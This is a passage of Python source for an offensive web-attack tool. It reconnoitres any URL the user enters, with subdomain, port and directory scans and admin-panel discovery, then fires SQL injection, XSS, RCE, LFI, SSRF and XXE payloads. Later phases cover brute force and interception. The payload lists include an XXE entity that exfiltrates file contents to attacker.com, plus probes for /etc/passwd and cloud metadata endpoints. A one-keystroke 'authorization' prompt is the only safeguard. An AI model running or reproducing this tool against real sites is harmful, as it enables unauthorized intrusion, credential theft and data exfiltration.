            '....\\\\....\\\\....\\\\windows\\\\win.ini',
            '../../../../windows/win.ini',
            '..\\..\\..\\..\\windows\\win.ini',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini'
        ]

    def generate_advanced_csrf_payloads(self):
        """Generate advanced CSRF payloads"""
        return [
            '<form action="[TARGET]" method="POST"><input name="param" value="attacked"></form><script>document.forms[0].submit();</script>',
            '<img src="[TARGET]?param=attacked">',
            '<script>fetch("[TARGET]", {method: "POST", body: "param=attacked"})</script>',
            '<a href="[TARGET]?param=attacked">Click me</a>'
        ]

    def generate_advanced_cors_payloads(self):
        """Generate advanced CORS payloads"""
        return [
            'https://evil.com',
            'http://localhost',
            'null',
            'https://attacker.com',
            'https://sub.attacker.com',
            'http://127.0.0.1',
            'https://example.com'
        ]

    def generate_advanced_ssrf_payloads(self):
        """Generate advanced SSRF payloads"""
        return [
            'http://localhost:22',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/meta-data/',
            'http://internal.service/',
            'file:///etc/passwd',
            'gopher://internal.service:25/',
            'dict://localhost:11211/stat',
            'http://[::1]:80/'
        ]

    def generate_advanced_xxe_payloads(self):
        """Generate advanced XXE payloads"""
        return [
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">',
            '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">',
            '<!ENTITY % xxe "<!ENTITY &#x25; send SYSTEM \\"http://attacker.com/?%file;\\">">',
            '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">'
        ]

    # ============ MAIN FUNCTIONS ============

    def print_banner(self):
        """Print enhanced banner"""
        banner = f"""
{Fore.MAGENTA}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ███████╗██╗     ██████╗ ██╗  ██╗███████╗                 ║
║   ██╔══██╗██║     ██╔═██╗ ██║  ██║██╔══██╗                 ║
║   ███████║██║     ██████╔╝███████║███████║                 ║
║   ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║                 ║
║   ██║  ██║███████╗██║     ██║  ██║██║  ██║                 ║
║   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝                 ║
║                                                              ║
║             Version 4.0 • ULTIMATE EDITION                  ║
║             AI-Powered • Auto-Players • Interception        ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.RED}⚠️  WARNING: For authorized testing only!{Style.RESET_ALL}
{Fore.YELLOW}🔒 Use only on systems you own or have explicit permission.{Style.RESET_ALL}
        """
        print(banner)

    def ask_permission(self):
        """Advanced permission system"""
        self.print_banner()
        
        print(f"{Fore.CYAN}🔐 ALPHA ULTIMATE PERMISSION SYSTEM")
        print("="*80)
        
        target = input(f"{Fore.YELLOW}🎯 Enter target website URL: {Style.RESET_ALL}").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
            
        print(f"\n{Fore.RED}⚠️  TARGET: {target}{Style.RESET_ALL}")
        
        # SSL Verification
        print(f"\n{Fore.BLUE}🔒 Verifying SSL Certificate...{Style.RESET_ALL}")
        ssl_info = self.verify_ssl_certificate(target)
        
        if ssl_info.get('valid'):
            print(f"{Fore.GREEN}✅ SSL Certificate: VALID{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ SSL Certificate: INVALID{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.RED}❓ Do you have AUTHORIZATION to test {target}? (Y/N): {Style.RESET_ALL}").lower()
        if confirm != 'y':
            print(f"{Fore.RED}🚫 Testing cancelled.{Style.RESET_ALL}")
            sys.exit()
            
        self.target_url = target
        self.results['ssl_info'] = ssl_info
        print(f"{Fore.GREEN}✅ Authorization confirmed! Starting penetration test...{Style.RESET_ALL}")
        return True

    def verify_ssl_certificate(self, url):
        """Verify SSL certificate"""
        try:
            hostname = urlparse(url).hostname
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            context.load_verify_locations(certifi.where())
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'valid': True,
                        'subject': dict(x[0] for x in cert.get('subject', [])),
                        'issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'expiration': cert.get('notAfter', ''),
                        'serial_number': cert.get('serialNumber', ''),
                        'version': cert.get('version', '')
                    }
        except Exception as e:
            return {'valid': False, 'error': str(e)}

    def run_pentest(self):
        """Run comprehensive penetration test with all features"""
        if not self.ask_permission():
            return
        
        self.start_time = time.time()
        
        try:
            print(f"\n{Fore.CYAN}🚀 Starting ULTIMATE Penetration Test{Style.RESET_ALL}")
            print("="*90)
            
            # === PHASE 1: Reconnaissance ===
            print(f"\n{Fore.BLUE}📡 PHASE 1: ADVANCED RECONNAISSANCE{Style.RESET_ALL}")
            self.advanced_waf_detection()
            self.subdomain_enumeration()
            self.advanced_port_scanning()
            self.technology_fingerprinting()
            self.advanced_directory_bruteforce()
            
            # === PHASE 2: Discovery ===
            print(f"\n{Fore.BLUE}🔍 PHASE 2: ADVANCED DISCOVERY{Style.RESET_ALL}")
            self.admin_finder()
            self.sensitive_file_discovery()
            self.api_endpoint_discovery()
            self.backup_file_discovery()
            self.enhanced_admin_detection()
            
            # === PHASE 3: Vulnerability Assessment ===
            print(f"\n{Fore.BLUE}💉 PHASE 3: VULNERABILITY ASSESSMENT{Style.RESET_ALL}")
            self.advanced_sql_injection_scan()
            self.advanced_xss_scan()
            self.advanced_rce_scan()
            self.advanced_lfi_scan()
            self.csrf_vulnerability_scan()
            self.cors_vulnerability_scan()
            self.ssrf_vulnerability_scan()
            self.xxe_vulnerability_scan()
            
            # === PHASE 4: Auto-Player Testing ===
            print(f"\n{Fore.BLUE}🎮 PHASE 4: AUTO-PLAYER TESTING{Style.RESET_ALL}")
            player_count = self.ask_player_count()
            self.auto_test_with_players(self.target_url, player_count)
            
            # === PHASE 5: Smart Password Generation ===
            print(f"\n{Fore.BLUE}🔑 PHASE 5: SMART PASSWORD GENERATION{Style.RESET_ALL}")
            password_count = self.ask_password_count()
            self.generate_password_list(password_count, 'high')
            
            # === PHASE 6: Brute Force ===
            print(f"\n{Fore.BLUE}🔥 PHASE 6: ADVANCED BRUTE FORCE{Style.RESET_ALL}")
            self.advanced_brute_force_attack()
            
            # === PHASE 7: Interception ===
            print(f"\n{Fore.BLUE}🔄 PHASE 7: INTERCEPTION{Style.RESET_ALL}")
            interceptor = self.start_interception()
            # Run interception for a few seconds
            time.sleep(5)
            self.stop_interception()
            
            # === PHASE 8: Report ===
            print(f"\n{Fore.BLUE}📊 PHASE 8: REPORT GENERATION{Style.RESET_ALL}")
            report_path = self.generate_report()
            
            # Final Summary
            self.show_summary(report_path)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}❌ Scan interrupted by user{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}💥 Critical error: {e}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()

    def ask_player_count(self):
        """Ask user for player count"""
        print(f"\n{Fore.YELLOW}🎮 Auto-Player Configuration:{Style.RESET_ALL}")
        print("1. Generate 10 players (Quick Test)")
        print("2. Generate 100 players (Standard)")
        print("3. Generate 500 players (Thorough)")
        print("4. Generate 1000 players (Full)")
        print("5. Custom count")
        
        choice = input(f"{Fore.GREEN}Select option (1-5): {Style.RESET_ALL}").strip()
        
        if choice == "1":
            return 10
        elif choice == "2":
            return 100
        elif choice == "3":
            return 500
        elif choice == "4":
            return 1000
        elif choice == "5":
            count = int(input(f"{Fore.YELLOW}Enter player count: {Style.RESET_ALL}").strip())
            return count
        else:
            return 100  # Default

    def ask_password_count(self):
        """Ask user for password count"""
        print(f"\n{Fore.YELLOW}🔑 Smart Password Configuration:{Style.RESET_ALL}")
        print("1. Generate 100 passwords")
        print("2. Generate 1000 passwords")
        print("3. Generate 5000 passwords")
        print("4. Generate 10000 passwords")
        print("5. Custom count")
        
        choice = input(f"{Fore.GREEN}Select option (1-5): {Style.RESET_ALL}").strip()
        
        if choice == "1":
            return 100
        elif choice == "2":
            return 1000
        elif choice == "3":
            return 5000
        elif choice == "4":
            return 10000
        elif choice == "5":
            count = int(input(f"{Fore.YELLOW}Enter password count: {Style.RESET_ALL}").strip())
            return count
        else:
            return 1000  # Default

    # ============ EXISTING SCAN METHODS (ENHANCED) ============

    def advanced_waf_detection(self):
        """Advanced WAF detection"""
        print(f"{Fore.BLUE}🛡️ Advanced WAF Detection...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            headers = str(response.headers).lower()
            content = response.text.lower()
            
            detected_wafs = []
            for waf, signatures in self.ai_learning_db['waf_signatures'].items():
                for signature in signatures:
                    if signature.lower() in headers or signature.lower() in content:
                        detected_wafs.append(waf)
                        break
            
            if detected_wafs:
                self.waf_detected = True
                self.results['waf_detected'] = True
                print(f"{Fore.RED}🚨 WAF Detected: {', '.join(detected_wafs)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}✅ No WAF Detected{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}❌ WAF Detection Failed: {e}{Style.RESET_ALL}")

    def subdomain_enumeration(self):
        """Enhanced subdomain enumeration"""
        print(f"{Fore.BLUE}🌐 Subdomain Enumeration...{Style.RESET_ALL}")
        
        domain = urlparse(self.target_url).netloc
        subdomains = set()
        
        # Expanded subdomain list
        common_subs = [
            'www', 'api', 'admin', 'mail', 'ftp', 'cpanel', 'webmail',
            'blog', 'dev', 'test', 'staging', 'secure', 'portal', 'app',
            'apps', 'backend', 'frontend', 'cdn', 'static', 'media',
            'images', 'img', 'video', 'docs', 'help', 'support', 'forum',
            'shop', 'store', 'cart', 'payment', 'db', 'database', 'sql',
            'git', 'svn', 'ssh', 'vpn', 'remote', 'access', 'mobile',
            'm', 'beta', 'alpha', 'demo', 'stage', 'prod', 'production',
            # Extended
            'files', 'downloads', 'uploads', 'assets', 'css', 'js',
            'fonts', 'img', 'photo', 'photos', 'gallery', 'media',
            'videos', 'audio', 'music', 'docs', 'documents', 'forms',
            'survey', 'poll', 'vote', 'chat', 'messenger', 'live'
        ]
        
        for sub in common_subs:
            subdomains.add(f"{sub}.{domain}")
            subdomains.add(f"{sub}1.{domain}")
            subdomains.add(f"{sub}2.{domain}")
            subdomains.add(f"{sub}-test.{domain}")
        
        valid_subdomains = []
        
        if CONCURRENT_AVAILABLE:
            with ThreadPoolExecutor(max_workers=25) as executor:
                future_to_sub = {executor.submit(self.check_subdomain, sub): sub for sub in subdomains}
                
                for future in as_completed(future_to_sub):
                    subdomain = future_to_sub[future]
                    try:
                        if future.result():
                            valid_subdomains.append(subdomain)
                            print(f"{Fore.GREEN}✅ Found: {subdomain}{Style.RESET_ALL}")
                    except Exception:
                        pass
        else:
            for sub in subdomains:
                if self.check_subdomain(sub):
                    valid_subdomains.append(sub)
                    print(f"{Fore.GREEN}✅ Found: {sub}{Style.RESET_ALL}")
        
        self.results['subdomains'] = valid_subdomains
        print(f"{Fore.GREEN}✅ Subdomains Found: {len(valid_subdomains)}{Style.RESET_ALL}")

    def check_subdomain(self, subdomain):
        """Check if subdomain exists"""
        try:
            response = self.session.get(f"https://{subdomain}", timeout=5, verify=False, allow_redirects=False)
            return response.status_code < 400
        except:
            try:
                response = self.session.get(f"http://{subdomain}", timeout=5, allow_redirects=False)
                return response.status_code < 400
            except:
                return False

    def advanced_port_scanning(self):
        """Enhanced port scanning"""
        print(f"{Fore.BLUE}🔍 Port Scanning...{Style.RESET_ALL}")
        
        domain = urlparse(self.target_url).netloc
        
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 
            2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389, 
            5432, 8080, 8443, 8888, 9000, 10000,
            # Extended
            143, 465, 587, 993, 995, 2525,
            8000, 8008, 8080, 8081, 8082, 8088,
            9001, 9090, 9091, 9100, 9200, 9300
        ]
        
        open_ports = []
        
        if CONCURRENT_AVAILABLE:
            with ThreadPoolExecutor(max_workers=50) as executor:
                future_to_port = {executor.submit(self.check_port, domain, port): port for port in common_ports}
                
                for future in as_completed(future_to_port):
                    port = future_to_port[future]
                    try:
                        if future.result():
                            open_ports.append(port)
                            print(f"{Fore.GREEN}✅ Port Open: {port}{Style.RESET_ALL}")
                    except Exception:
                        pass
        else:
            for port in common_ports:
                if self.check_port(domain, port):
                    open_ports.append(port)
                    print(f"{Fore.GREEN}✅ Port Open: {port}{Style.RESET_ALL}")
        
        self.results['ports'] = open_ports
        print(f"{Fore.GREEN}✅ Open Ports: {len(open_ports)}{Style.RESET_ALL}")

    def check_port(self, domain, port):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((domain, port))
            sock.close()
            return result == 0
        except:
            return False

    def technology_fingerprinting(self):
        """Enhanced technology fingerprinting"""
        print(f"{Fore.BLUE}🔧 Technology Fingerprinting...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            detected_tech = []
            
            for tech, signatures in self.learning_db['technology_signatures'].items():
                for signature in signatures:
                    if signature.lower() in content or signature.lower() in headers:
                        detected_tech.append(tech)
                        break
            
            self.results['technologies'] = detected_tech
            
            if detected_tech:
                print(f"{Fore.GREEN}✅ Technologies: {', '.join(detected_tech)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠️ No technologies detected{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED}❌ Technology Detection Failed: {e}{Style.RESET_ALL}")

    def advanced_directory_bruteforce(self):
        """Enhanced directory brute force"""
        print(f"{Fore.BLUE}📁 Directory Bruteforce...{Style.RESET_ALL}")
        
        directories = self.ai_learning_db['common_paths']['hidden_directories']
        found_dirs = []
        
        if CONCURRENT_AVAILABLE:
            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_dir = {executor.submit(self.check_directory, dir_name): dir_name for dir_name in directories}
                
                for future in as_completed(future_to_dir):
                    dir_name = future_to_dir[future]
                    try:
                        if future.result():
                            found_dirs.append(dir_name)
                            print(f"{Fore.GREEN}✅ Directory: /{dir_name}/{Style.RESET_ALL}")
                    except Exception:
                        pass
        else:
            for dir_name in directories:
                if self.check_directory(dir_name):
                    found_dirs.append(dir_name)
                    print(f"{Fore.GREEN}✅ Directory: /{dir_name}/{Style.RESET_ALL}")
        
        self.results['hidden_directories'] = found_dirs
        print(f"{Fore.GREEN}✅ Directories Found: {len(found_dirs)}{Style.RESET_ALL}")

    def check_directory(self, directory):
        """Check if directory exists"""
        try:
            url = f"{self.target_url}/{directory}/"
            response = self.session.get(url, timeout=5, verify=False)
            return response.status_code in [200, 301, 302, 403]
        except:
            return False

    def admin_finder(self):
        """Enhanced admin panel finder"""
        print(f"{Fore.BLUE}🔍 Admin Panel Discovery...{Style.RESET_ALL}")
        
        admin_paths = self.generate_ai_admin_paths()
        
        found_panels = []
        
        for path in admin_paths:
            full_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(full_url, timeout=5, verify=False)
                if response.status_code in [200, 301, 302, 403]:
                    if self.is_advanced_admin_panel(response, full_url):
                        panel_data = {
                            'url': full_url,
                            'status': response.status_code,
                            'title': self.extract_title(response.text),
                            'size': len(response.text)
                        }
                        found_panels.append(panel_data)
                        print(f"{Fore.GREEN}✅ Admin Panel: {full_url}{Style.RESET_ALL}")
            except:
                pass
        
        self.results['admin_panels'] = found_panels
        print(f"{Fore.GREEN}✅ Admin Panels Found: {len(found_panels)}{Style.RESET_ALL}")

    def generate_ai_admin_paths(self):
        """Generate AI-powered admin paths"""
        all_paths = set()
        
        # Base paths
        base_paths = self.ai_learning_db['common_paths']['admin_paths']
        tech_paths = self.get_technology_specific_paths()
        all_base_paths = base_paths + tech_paths
        
        # Generate variations
        extensions = ['', '.php', '.html', '.asp', '.aspx', '.jsp', '.cgi', '.pl']
        prefixes = ['', '/', '../', '../../', '../../../']
        
        for base in all_base_paths:
            for ext in extensions:
                for prefix in prefixes:
                    all_paths.add(f"{prefix}{base}{ext}")
                    all_paths.add(f"{prefix}{base}/")
                    all_paths.add(f"{prefix}{base}/index{ext}")
                    all_paths.add(f"{prefix}{base}1{ext}")
                    all_paths.add(f"{prefix}{base}2{ext}")
                    all_paths.add(f"{prefix}{base}_panel{ext}")
                    all_paths.add(f"{prefix}{base}-admin{ext}")
                    all_paths.add(f"{prefix}{base}2024{ext}")
                    all_paths.add(f"{prefix}{base}_v2{ext}")
        
        return list(all_paths)

    def get_technology_specific_paths(self):
        """Get technology-specific paths"""
        tech_paths = []
        detected_tech = self.results['technologies']
        
        technology_paths = {
            'wordpress': ['wp-admin', 'wp-login.php', 'wp-content', 'wp-includes'],
            'joomla': ['administrator', 'joomla/administrator'],
            'drupal': ['user/login', 'admin', 'node/add'],
            'laravel': ['login', 'register', 'admin', 'dashboard'],
            'django': ['admin', 'accounts/login'],
            'rails': ['users/sign_in', 'admin'],
            'aspnet': ['Account/Login', 'Admin']
        }
        
        for tech in detected_tech:
            if tech in technology_paths:
                tech_paths.extend(technology_paths[tech])
        
        return tech_paths

    def is_advanced_admin_panel(self, response, url):
        """Advanced admin panel detection"""
        if response.status_code not in [200, 301, 302, 403, 401]:
            return False
        
        text_lower = response.text.lower()
        url_lower = url.lower()
        
        score = 0
        
        admin_url_indicators = ['admin', 'login', 'dashboard', 'panel', 'control', 'manage']
        for indicator in admin_url_indicators:
            if indicator in url_lower:
                score += 3
        
        admin_content_indicators = [
            'password', 'username', 'sign in', 'log in', 'admin panel',
            'control panel', 'dashboard', 'welcome admin', 'administrator'
        ]
        
        for indicator in admin_content_indicators:
            if indicator in text_lower:
                score += 2
        
        if '<form' in text_lower and ('password' in text_lower or 'login' in text_lower):
            score += 5
        
        return score >= 6

    def extract_title(self, html):
        """Extract page title"""
        if BEAUTIFULSOUP_AVAILABLE:
            try:
                soup = BeautifulSoup(html, 'html.parser')
                title = soup.find('title')
                return title.string.strip() if title else "No Title"
            except:
                return "No Title"
        else:
            title_match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE)
            return title_match.group(1).strip() if title_match else "No Title"

    def sensitive_file_discovery(self):
        """Discover sensitive files"""
        print(f"{Fore.BLUE}📁 Sensitive File Discovery...{Style.RESET_ALL}")
        
        file_paths = self.ai_learning_db['common_paths']['file_paths']
        found_files = []
        
        for file_path in file_paths:
            full_url = urljoin(self.target_url, file_path)
            try:
                response = self.session.get(full_url, timeout=5, verify=False)
                if response.status_code == 200:
                    found_files.append({
                        'url': full_url,
                        'size': len(response.text),
                        'status': response.status_code
                    })
                    print(f"{Fore.GREEN}✅ Found: {file_path}{Style.RESET_ALL}")
            except:
                pass
        
        self.results['sensitive_files'] = found_files
        print(f"{Fore.GREEN}✅ Files Found: {len(found_files)}{Style.RESET_ALL}")

    def api_endpoint_discovery(self):
        """Discover API endpoints"""
        print(f"{Fore.BLUE}🔗 API Discovery...{Style.RESET_ALL}")
        
        endpoints = self.ai_learning_db['api_endpoints']
        found_endpoints = []
        
        for endpoint in endpoints:
            url = f"{self.target_url}/{endpoint}"
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code in [200, 201, 204]:
                    found_endpoints.append({
                        'url': url,
                        'status': response.status_code,
                        'content_type': response.headers.get('content-type', '')
                    })
                    print(f"{Fore.GREEN}✅ API: {endpoint}{Style.RESET_ALL}")
            except:
                pass
        
        self.results['api_endpoints'] = found_endpoints
        print(f"{Fore.GREEN}✅ APIs Found: {len(found_endpoints)}{Style.RESET_ALL}")

    def backup_file_discovery(self):
        """Discover backup files"""
        print(f"{Fore.BLUE}💾 Backup Discovery...{Style.RESET_ALL}")
        
        backup_patterns = self.ai_learning_db['backup_patterns']
        found_backups = []
        
        for pattern in backup_patterns:
            test_files = [
                f"backup{pattern}",
                f"database{pattern}",
                f"site{pattern}",
                f"web{pattern}",
                f"app{pattern}"
            ]
            
            for test_file in test_files:
                url = f"{self.target_url}/{test_file}"
                try:
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code == 200 and len(response.content) > 0:
                        found_backups.append({
                            'url': url,
                            'size': len(response.content),
                            'status': response.status_code
                        })
                        print(f"{Fore.GREEN}✅ Backup: {test_file}{Style.RESET_ALL}")
                        break
                except:
                    pass
        
        self.results['backup_files'] = found_backups
        print(f"{Fore.GREEN}✅ Backups Found: {len(found_backups)}{Style.RESET_ALL}")

    def enhanced_admin_detection(self):
        """Enhanced admin detection"""
        print(f"{Fore.BLUE}🔍 Enhanced Admin Detection...{Style.RESET_ALL}")
        
        admin_paths = [
            'wp-admin', 'wp-login.php', 'administrator', 'admin',
            'joomla/administrator', 'administrator/index.php',
            'user/login', 'admin', 'admin/login',
            'backend', 'panel', 'control', 'manage', 'dashboard',
            'cp', 'admincp', 'webadmin', 'system', 'config',
            'login', 'signin', 'auth', 'authentication',
            'admin123', 'admin2024', 'adminarea', 'adminpanel'
        ]
        
        found_panels = []
        
        for path in admin_paths:
            url = f"{self.target_url}/{path}"
            try:
                response = self.session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    if self.is_admin_panel_advanced(response.text, url):
                        panel_type = self.detect_panel_type(response.text)
                        found_panels.append({
                            'url': url,
                            'type': panel_type,
                            'status': response.status_code,
                            'title': self.extract_title(response.text)
                        })
                        print(f"{Fore.GREEN}✅ Admin Panel: {url} [{panel_type}]{Style.RESET_ALL}")
            except:
                pass
        
        self.results['admin_panels'].extend(found_panels)
        print(f"{Fore.GREEN}✅ Enhanced Admin Found: {len(found_panels)}{Style.RESET_ALL}")

    def is_admin_panel_advanced(self, html_content, url):
        """Advanced admin panel detection"""
        content_lower = html_content.lower()
        url_lower = url.lower()
        
        score = 0
        
        admin_url_indicators = ['admin', 'login', 'dashboard', 'panel', 'control', 'manage']
        for indicator in admin_url_indicators:
            if indicator in url_lower:
                score += 3
        
        admin_content_indicators = [
            'password', 'username', 'sign in', 'log in', 'admin panel',
            'control panel', 'dashboard', 'welcome admin', 'administrator'
        ]
        
        for indicator in admin_content_indicators:
            if indicator in content_lower:
                score += 2
        
        if '<form' in content_lower and ('password' in content_lower or 'login' in content_lower):
            score += 5
        
        return score >= 6

    def detect_panel_type(self, html_content):
        """Detect panel type"""
        content_lower = html_content.lower()
        
        if 'wordpress' in content_lower or 'wp-admin' in content_lower:
            return 'WordPress'
        elif 'joomla' in content_lower:
            return 'Joomla'
        elif 'drupal' in content_lower:
            return 'Drupal'
        elif 'magento' in content_lower:
            return 'Magento'
        elif 'laravel' in content_lower:
            return 'Laravel'
        else:
            return 'Custom'

    # ============ VULNERABILITY SCANS ============

    def advanced_sql_injection_scan(self):
        """Advanced SQL injection scan"""
        print(f"{Fore.BLUE}💉 SQL Injection Scan...{Style.RESET_ALL}")
        
        payloads = self.generate_advanced_sql_payloads()
        targets = [self.target_url] + [ep['url'] for ep in self.results.get('api_endpoints', [])]
        
        found = []
        for base in targets:
            sep = '&' if '?' in base else '?'
            for payload in payloads:
                test_url = f"{base}{sep}q={quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
                    self.request_count += 1
                    content = resp.text.lower()
                    errors = self.learning_db['vulnerability_patterns']['sql_errors']
                    if any(err.lower() in content for err in errors):
                        item = {
                            'url': test_url,
                            'payload': payload,
                            'status': resp.status_code
                        }
                        self.results['working_sql_injections'].append(item)
                        found.append(item)
                        print(f"{Fore.RED}🚨 SQLi Detected: {test_url}{Style.RESET_ALL}")
                except Exception:
                    continue
        
        print(f"{Fore.GREEN}✅ SQLi Found: {len(found)}{Style.RESET_ALL}")

    def advanced_xss_scan(self):
        """Advanced XSS scan"""
        print(f"{Fore.BLUE}🎯 XSS Scan...{Style.RESET_ALL}")
        
        payloads = self.generate_advanced_xss_payloads()
        targets = [self.target_url] + [ep['url'] for ep in self.results.get('api_endpoints', [])]
        
        found = []
        for base in targets:
            sep = '&' if '?' in base else '?'
            for payload in payloads:
                test_url = f"{base}{sep}x={quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
                    self.request_count += 1
                    text = resp.text
                    if ('alert(' in text) or (payload in text):
                        item = {
                            'url': test_url,
                            'payload': payload,
                            'status': resp.status_code
                        }
                        self.results['xss_vulnerabilities'].append(item)
                        found.append(item)
                        print(f"{Fore.RED}🚨 XSS Detected: {test_url}{Style.RESET_ALL}")
                except Exception:
                    continue
        
        print(f"{Fore.GREEN}✅ XSS Found: {len(found)}{Style.RESET_ALL}")

    def advanced_rce_scan(self):
        """Advanced RCE scan"""
        print(f"{Fore.BLUE}🔥 RCE Scan...{Style.RESET_ALL}")
        
        payloads = self.generate_advanced_rce_payloads()
        params = ['cmd', 'exec', 'command', 'run']
        targets = [self.target_url] + [ep['url'] for ep in self.results.get('api_endpoints', [])]
        
        found = []
        for base in targets:
            for param in params:
                sep = '&' if '?' in base else '?'
                for payload in payloads:
                    test_url = f"{base}{sep}{param}={quote(payload)}"
                    try:
                        resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
                        self.request_count += 1
                        content = resp.text.lower()
                        patterns = self.learning_db['vulnerability_patterns']['rce_patterns']
                        indicators = ['uid=', 'gid=', 'root:', 'administrator']
                        if any(p.lower() in content for p in patterns) or any(i in content for i in indicators):
                            item = {
                                'url': test_url,
                                'payload': payload,
                                'status': resp.status_code
                            }
                            self.results['rce_vulnerabilities'].append(item)
                            found.append(item)
                            print(f"{Fore.RED}🚨 RCE Indicator: {test_url}{Style.RESET_ALL}")
                    except Exception:
                        continue
        
        print(f"{Fore.GREEN}✅ RCE Found: {len(found)}{Style.RESET_ALL}")

    def advanced_lfi_scan(self):
        """Advanced LFI scan"""
        print(f"{Fore.BLUE}📁 LFI Scan...{Style.RESET_ALL}")
        
        payloads = self.generate_advanced_lfi_payloads()
        params = ['file', 'path', 'page']
        targets = [self.target_url] + [ep['url'] for ep in self.results.get('api_endpoints', [])]
        
        found = []
        for base in targets:
            for param in params:
                sep = '&' if '?' in base else '?'
                for payload in payloads:
                    test_url = f"{base}{sep}{param}={quote(payload)}"
                    try:
                        resp = self.session.get(test_url, timeout=6, verify=False, allow_redirects=True)
                        self.request_count += 1
                        content = resp.text.lower()
                        indicators = ['root:', '/etc/passwd', 'windows\\win.ini', 'warning', 'error']
                        patterns = self.learning_db['vulnerability_patterns']['lfi_patterns']
                        if any(i in content for i in indicators) or any(p.lower() in content for p in patterns):
                            item = {
                                'url': test_url,
                                'payload': payload,
                                'status': resp.status_code
                            }
                            self.results['lfi_vulnerabilities'].append(item)
                            found.append(item)
                            print(f"{Fore.RED}🚨 LFI Indicator: {test_url}{Style.RESET_ALL}")
                    except Exception:
                        continue
        
        print(f"{Fore.GREEN}✅ LFI Found: {len(found)}{Style.RESET_ALL}")

    def csrf_vulnerability_scan(self):
        """CSRF vulnerability scan"""
        print(f"{Fore.BLUE}🛡️ CSRF Scan...{Style.RESET_ALL}")
        
        suspected = []
        try:
            resp = self.session.get(self.target_url, timeout=8, verify=False)
            html = resp.text
            
            if BEAUTIFULSOUP_AVAILABLE:
                try:
                    soup = BeautifulSoup(html, 'html.parser')
                    forms = soup.find_all('form')
                except:
                    forms = []
            else:
                forms = re.findall(r'<form[\s\S]*?</form>', html, re.IGNORECASE)
            
            token_names = ['csrf', 'token', '_token', 'csrf_token']
            for f in forms:
                text = str(f).lower() if hasattr(f, 'lower') else str(f).lower()
                if 'method="post"' in text or 'method=post' in text:
                    has_token = any(name in text for name in token_names)
                    if not has_token:
                        suspected.append({'action': self.target_url, 'method': 'post'})
                        print(f"{Fore.RED}🚨 Possible CSRF: missing token in POST form{Style.RESET_ALL}")
        except Exception:
            pass
        
        self.results['csrf_vulnerabilities'] = suspected
        print(f"{Fore.GREEN}✅ CSRF Suspected: {len(suspected)}{Style.RESET_ALL}")

    def cors_vulnerability_scan(self):
        """CORS vulnerability scan"""
        print(f"{Fore.BLUE}🔄 CORS Scan...{Style.RESET_ALL}")
        
        cors_payloads = self.ai_learning_db['cors_payloads']
        vulnerable = []
        
        for endpoint in self.results['api_endpoints']:
            for payload in cors_payloads:
                try:
                    headers = {'Origin': payload, 'User-Agent': random.choice(self.user_agents)}
                    response = self.session.get(endpoint['url'], headers=headers, timeout=5, verify=False)
                    cors_headers = response.headers.get('Access-Control-Allow-Origin', '')
                    if payload in cors_headers or cors_headers == '*':
                        vulnerable.append({
                            'url': endpoint['url'],
                            'vulnerable_header': cors_headers,
                            'payload': payload
                        })
                        print(f"{Fore.RED}🚨 CORS Vulnerability: {endpoint['url']}{Style.RESET_ALL}")
                        break
                except:
                    pass
        
        self.results['cors_vulnerabilities'] = vulnerable
        print(f"{Fore.GREEN}✅ CORS Found: {len(vulnerable)}{Style.RESET_ALL}")

    def ssrf_vulnerability_scan(self):
        """SSRF vulnerability scan"""
        print(f"{Fore.BLUE}🌐 SSRF Scan...{Style.RESET_ALL}")
        
        ssrf_payloads = self.ai_learning_db['ssrf_payloads']
        vulnerable = []
        
        for endpoint in self.results['api_endpoints']:
            if '?' in endpoint['url'] or any(param in endpoint['url'].lower() for param in ['url=', 'image=', 'file=', 'path=']):
                for payload in ssrf_payloads:
                    try:
                        test_url = f"{endpoint['url']}{'&' if '?' in endpoint['url'] else '?'}url={quote(payload)}"
                        response = self.session.get(test_url, timeout=5, verify=False)
                        if self.detect_ssrf_response(response, payload):
                            vulnerable.append({
                                'url': endpoint['url'],
                                'payload': payload,
